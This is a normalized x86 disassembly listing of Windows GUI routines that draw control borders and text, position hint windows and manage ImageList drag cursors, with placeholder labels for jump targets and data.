mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403430
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403430
jmp r-xdata
sub_44a0ec
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_443d6c
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_443d6c
sub_44a130
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_443d6c
sub_44a180
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_44a210
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44a476
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4242a4
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_433abc
call sub_433b9c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_433abc
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_4341b4
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_44a4b8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406dd8
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_4426fc
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_446c8c
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_443d6c
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_444f30
sub_44a524
push ebx
push esi
mov esi edx
call sub_4599ec
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406d74
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_443d6c
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406d74
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_443d6c
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_44a588
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_447054
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44a5c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44a5b8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44a600
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_441cb8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4243c0
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_441794
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_44a65c
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_441d90
test bl bl
jle r-xdata
xor eax eax
call sub_43fd88
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_44a69c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4246c4
xor eax eax
push ebp
push sub_44a737
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424a38
xor eax eax
push ebp
push sub_44a714
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a71b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_424a38
retn
sub_44a748
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b03c
mov edx 0x80ffff
mov eax esi
call sub_442d58
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_4248d8
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_42438c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_44a7b4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44622c
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c240
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4461c4
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_44a820
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44a876
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a87d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ReleaseDC
retn
sub_44a884
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44a91d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_423aa4
mov eax ebx
call sub_444ed8
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_442bb8
mov eax [ ebp - 0x14 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x208 ]
call sub_4249b8
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a924
lea eax [ ebp - 0x14 ]
call sub_404008
retn
sub_44a92c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_44a998
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_44aa23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44aa2a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_442bb8
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_424818
mov edx eax
add edx 0x6
mov eax esi
call sub_442374
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_442bb8
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_424834
mov edx eax
add edx 0x4
mov eax esi
call sub_442398
sub_44aa30
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_44ac09
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442be8
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_443e10
mov eax [ esi ]
call sub_460224
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_460230
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_460224
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_460218
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_460230
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_46020c
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_460218
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_46020c
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_446ad4
push 0x4
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac10
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4042c8
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44dc84
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call [ rw-data ]
sub_44ac18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44ac40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_419034
mov eax esi
call sub_444ed8
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ esi + 0x208 ]
call sub_4249b8
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_44ac9c
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_419034
call sub_433abc
call sub_433b9c
test al al
jne r-xdata
call sub_433abc
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_433e28
push esp
push 0x1
push 0xf
push 0x0
call sub_433abc
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_433c0c
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_44ad08
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4473dc
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_44ad2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44ad6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ae2c
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4606f8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42b360
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4606f8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42b360
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_44ae38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44fe08
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44ae98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44fccc
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_44ad6c
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_44aef8
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_44ae38
push 0x0
call ShowCursor
sub_44aef8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44fccc
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_44af5c
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44ad2c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_44af5c
push ebx
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_44af80
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fccc
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_44ad2c
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44aff4
push ebx
push esi
mov esi eax
mov eax esi
call sub_44fccc
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_44af5c
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_44ae80
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_44b03c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4450cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4243c0
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_441794
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_44b098
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4451f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_44b0e8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4246c4
xor eax eax
push ebp
push sub_44b186
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_424a38
xor eax eax
push ebp
push sub_44b163
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4417ac
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b16a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_424a38
retn
sub_44b198
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44b22c
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_44b1b4
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44b22c
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
